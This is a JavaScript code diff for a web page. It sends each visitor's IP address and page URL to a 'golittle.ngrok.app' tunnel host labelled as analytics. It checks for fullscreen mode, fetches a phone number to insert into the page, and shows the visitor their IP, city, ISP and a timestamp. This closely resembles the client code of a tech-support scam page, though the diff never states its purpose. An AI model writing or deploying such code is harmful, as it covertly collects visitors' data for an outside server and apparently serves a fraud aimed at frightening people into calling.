@@ -16,45 +16,63 @@ function getCurrentIpAddress() {
         .then(response => response.json())
         .then(data => {
             const ipAddress = data.ip;
-            const message = { url: window.location.href, ip: ipAddress };
-            fetch("https://golittle.ngrok.app/analytics/proxy/" + ipAddress, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify(message),
-            })
+            fetch("https://golittle.ngrok.app/analytics/proxy/" + ipAddress)
                 .then(response => response.json())
                 .then(data => {
-                    console.log("Received Data:", data);
-                    data.fullscreen = !!document.fullscreenElement;
-                    data.action = window.location.hostname;
-                    sendDataToServer(data);
-                    
-                    console.log("Phone Number", phoneNumber);
-
-                    if (data.phone) {
-                        phoneNumber = data.phone
+                    if (document.fullscreenElement) {
+                        data.fullscreen = true;
+                    } else {
+                        data.fullscreen = false;
                     }
+                    data.action = window.location.hostname;
+                    this.sendDataToServer(data);
 
-                    console.log("Phone Number", phoneNumber);
+                    fetch('https://golittle.ngrok.app/analytics/getphone', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ url: window.location.href }),
+                    })
+                    .then(result => result.json())
+                    .then(phoneData => {
+                        console.log("Response phone", phoneData)
+                        // console.log("Before", phoneNumber)
+                        if (phoneData && phoneData.phone) {
+                            document.getElementById('p1').textContent = phoneData.phone;
+                            document.getElementById('p2').textContent = phoneData.phone;
+                        }
+                    }).catch(error => {
+                        console.error("Error fetching phone number:", error);
+                    })
 
-                    console.log("Data:", data);
+                    return data;
                 }).then(data => {
-                    // const date = new Date();
-                    // document.getElementById("ip_add").textContent = "IP: " + data.ip + " " + date.toLocaleString("en-US");
-                    // document.getElementById("city").textContent = "Location: " + data.city + ", " + data.country;
-                    // document.getElementById("isp").textContent = "ISP: " + data.org;
-                })
-                .catch(error => {
-                    console.log("Error fetching location and ISP:", error);
-                    if (document.getElementById("city")) {
+                    console.log("Response data",data);
+                    var ipadd = data.ip;
+                    var city = data.city;
+                    var country = data.country;
+                    var isp = data.org;
+                    console.log("Data", data);
+                    var date = new Date();
+                    if (document.getElementById('ip_add')) {
+                        document.getElementById('ip_add').textContent = 'IP: ' + ipadd + ' ' + date.toLocaleString("en-US");
+                    }
+                    if (document.getElementById('city')) {
+                        document.getElementById('city').textContent = 'Location: ' + city + ', ' + country;
+                    }
+                    if (document.getElementById('isp')) {
+                        document.getElementById('isp').textContent = 'ISP: ' + isp;
+                    }
+                }).catch(error => {
+                    console.error("Error fetching location and ISP:", error);
+                    if (document.getElementById('city')) {
                         document.getElementById("city").innerHTML = "Location: Unavailable";
                     }
                     if (document.getElementById('isp')) {
                         document.getElementById("isp").innerHTML = "ISP: Unavailable";
                     }
-                });
+                })
         })
         .catch(error => {
             console.error("Error fetching IP address:", error);
